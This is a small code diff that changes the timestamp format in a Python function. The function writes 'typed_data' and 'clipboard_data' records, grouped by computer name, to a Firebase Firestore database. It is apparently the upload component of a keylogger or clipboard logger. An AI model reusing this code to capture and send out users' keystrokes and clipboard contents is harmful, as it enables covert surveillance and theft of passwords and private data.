@@ -14,10 +14,10 @@ firebase_admin.initialize_app(cred,{
 db = firestore.client()
 
 def write_data(data, comname):
-    db.collection(comname).document(str(datetime.now().strftime("%Y-%m-%d_%H%M%S"))).set({
+    db.collection(comname).document(str(datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))).set({
         'typed_data' : data['typed_data'],
         'clipboard_data' : data['clipboard_data'],
-        'date_time': datetime.now().strftime("%Y-%m-%d_%H%M%S"),
+        'date_time': datetime.now().strftime("%Y-%m-%d_%H:%M:%S"),
     }, merge= True)
 
 
